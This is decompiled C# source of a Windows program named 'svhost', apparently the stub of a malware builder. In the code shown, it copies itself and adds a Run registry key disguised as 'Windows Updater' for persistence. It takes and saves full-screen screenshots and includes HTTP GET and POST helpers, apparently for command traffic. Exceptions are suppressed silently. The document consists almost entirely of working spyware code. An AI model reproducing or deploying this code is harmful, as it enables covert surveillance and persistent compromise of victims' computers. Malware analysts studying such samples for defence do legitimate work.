// Decompiled with JetBrains decompiler
// Type: svhost.Functions
// Assembly: svhost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7DC793DB-CF4C-4ECD-BC3A-2E8425BD618A
// Assembly location: C:\Users\matze\Desktop\Neuer Ordner (7)\Builder\Builder\Resources\svhost.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using svhost.My;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;

namespace svhost
{
  [StandardModule]
  internal sealed class Functions
  {
    public static string path_screenshot2;

    public static string Send_GET(string URL)
    {
      Uri requestUri = new Uri(URL);
      if (Operators.CompareString(requestUri.Scheme, Uri.UriSchemeHttp, false) != 0)
        return "FAIL";
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(requestUri);
      httpWebRequest.Method = "GET";
      HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
      string end = new StreamReader(response.GetResponseStream()).ReadToEnd();
      response.Close();
      return end;
    }

    public static string Send_POST(string URL)
    {
      Uri requestUri = new Uri(URL);
      if (Operators.CompareString(requestUri.Scheme, Uri.UriSchemeHttp, false) != 0)
        return (string) null;
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(requestUri);
      httpWebRequest.Method = "POST";
      HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
      string end = new StreamReader(response.GetResponseStream()).ReadToEnd();
      response.Close();
      return end;
    }

    public static void Install_server()
    {
      try
      {
        MyProject.Computer.FileSystem.CopyFile(MyProject.Forms.Form1.path1, MyProject.Forms.Form1.path2, true);
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows Updater", (object) (MyProject.Forms.Form1.path2 + " / start"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void screenshot()
    {
      try
      {
        Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
        Graphics.FromImage((Image) new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height)).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void screenshot_2()
    {
      try
      {
        Functions.path_screenshot2 = Interaction.Environ("tmp") + "\\" + DateAndTime.Now.ToString("yyyy-MM-dd-hh-mm-ss") + "-screenshot.png";
        Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
        Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
        Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
        MyProject.Forms.Form1.PictureBox1.Image = (Image) bitmap;
        MyProject.Forms.Form1.PictureBox1.Image.Save(Functions.path_screenshot2, ImageFormat.Png);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
